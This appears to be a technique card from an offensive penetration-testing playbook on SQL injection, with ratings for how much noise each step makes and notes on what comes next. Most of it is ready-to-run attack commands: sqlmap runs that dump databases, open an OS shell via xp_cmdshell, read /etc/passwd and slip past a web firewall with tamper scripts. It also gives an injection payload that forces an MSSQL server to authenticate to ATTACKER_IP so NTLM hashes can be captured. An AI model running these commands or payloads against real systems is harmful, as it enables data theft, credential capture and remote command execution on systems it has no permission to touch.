# SQL Injection

tags: sql, injection, sqli, sqlmap, database, mssql, mysql, xp_cmdshell, rce, credential

## Objective
Discover and exploit SQL injection vulnerabilities to extract data, escalate privileges, or gain OS-level command execution.

## Prerequisites
- Web application with potential injection points identified
- sqlmap installed

## Methodology

### Discovery and Exploitation
```bash
# Basic detection and database enumeration
sqlmap -u "http://target/page?id=1" --batch --dbs

# From Burp saved request (recommended — handles cookies, POST, headers)
sqlmap -r request.txt --batch --dbs

# Thorough scan — higher level and risk
sqlmap -u URL --level 3 --risk 3 --batch

# Dump specific table
sqlmap -u "http://target/page?id=1" -D db --tables -T table --dump
```

### OS Command Execution
```bash
# xp_cmdshell (MSSQL) or UDF (MySQL) — OPSEC: 0.9
sqlmap -u URL --os-shell

# File read
sqlmap -u URL --file-read="/etc/passwd"
```

### MSSQL NTLM Theft (no sqlmap needed)
```sql
-- Triggers NTLM auth to attacker — capture with Responder
'; EXEC xp_dirtree '\\ATTACKER_IP\share'; --
```
Combine with Responder to capture NTLMv2 hashes for offline cracking.

### WAF Bypass
```bash
# Tamper scripts for WAF evasion
sqlmap -u URL --tamper=space2comment,between,randomcase --random-agent
```

## Graph Reporting
- **Credential nodes**: from dumped database credentials
- **Host node enrichment**: OS info from `--os-shell` output
- **VALID_ON edges**: database credentials → user accounts
- **HAS_SESSION edges**: if OS shell obtained
- **Service node enrichment**: database type, version

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Time-based blind | 0.5 |
| Union/error-based | 0.7 |
| OS shell (xp_cmdshell) | 0.9 |
| NTLM theft via xp_dirtree | 0.4 |

**Detection**: WAF SQL injection signatures, unusual query patterns in database logs, xp_cmdshell execution events, long-running queries (time-based blind).

## Sequencing
- **After**: Web Reconnaissance, Web Vulnerability Scanning
- **Feeds →**: Credential Dumping (from database), NTLM Relay (hash theft), Lateral Movement (OS shell)
